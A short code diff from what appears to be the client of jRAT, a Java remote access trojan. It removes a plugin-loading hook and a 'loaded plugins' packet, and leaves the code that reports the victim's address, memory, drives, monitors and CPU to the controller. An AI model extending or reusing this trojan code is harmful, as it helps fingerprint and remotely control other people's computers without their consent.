@@ -18,7 +18,6 @@ import jrat.client.packets.outgoing.Packet12InitLocalAddress;
 import jrat.client.packets.outgoing.Packet13InitTotalMemory;
 import jrat.client.packets.outgoing.Packet14InitAvailableCores;
 import jrat.client.packets.outgoing.Packet15InitJavaPath;
-import jrat.client.packets.outgoing.Packet16LoadedPlugins;
 import jrat.client.packets.outgoing.Packet17InitDrives;
 import jrat.client.packets.outgoing.Packet18InitMonitors;
 import jrat.client.packets.outgoing.Packet19InitCPU;
@@ -118,10 +117,6 @@ public class Connection implements Runnable {
 
 			status(Constants.STATUS_READY);
 
-			for (Plugin plugin : Plugin.list) {
-				plugin.methods.get("onconnect").invoke(plugin.instance, dis, dos);
-			}
-			
 			while (true) {
 				short header = readShort();
 				
@@ -157,7 +152,6 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet13InitTotalMemory());
 		addToSendQueue(new Packet14InitAvailableCores());
 		addToSendQueue(new Packet15InitJavaPath());
-		addToSendQueue(new Packet16LoadedPlugins());
 		addToSendQueue(new Packet17InitDrives());
 		addToSendQueue(new Packet18InitMonitors());
 		addToSendQueue(new Packet19InitCPU());
